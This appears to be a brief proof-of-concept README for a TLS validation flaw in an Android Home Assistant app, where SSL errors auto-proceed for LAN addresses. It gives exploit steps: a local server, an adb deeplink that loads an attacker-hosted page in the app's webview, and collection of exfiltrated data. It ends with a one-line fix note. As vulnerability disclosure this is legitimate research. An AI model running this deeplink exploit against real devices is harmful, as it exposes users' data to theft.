# 4.1_TLS_Certificate_Validation_Error - TLS Bypass for LAN

## Vulnerability
onReceivedSslError auto-proceeds for LAN IP addresses

## Exploit
1. Start server: `python server.py`
2. Trigger deeplink:
```
adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/4.1_TLS_Certificate_Validation_Error.html%23home-assistant.io"
```
3. Check `received/` for exfiltrated data

## Fixed Version
Implement proper origin validation, user confirmation dialogs, and restrict vulnerability scope.
